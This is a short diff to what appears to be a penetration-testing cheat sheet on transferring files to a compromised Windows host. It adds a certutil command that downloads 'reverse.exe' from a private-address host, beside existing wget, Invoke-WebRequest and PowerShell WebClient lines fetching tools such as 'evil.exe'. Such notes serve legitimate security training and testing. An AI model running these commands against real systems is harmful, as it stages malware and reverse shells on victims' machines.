@@ -28,6 +28,10 @@ wget 172.16.0.109/test
 Invoke-WebRequest http://10.10.14.45:1234/required_tool -O tool
 
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+
+certutil.exe -urlcache -split -f http://10.20.150.101/reverse.exe reverse.exe
+
+
 ```
 
 You can run a powershell script right away with:
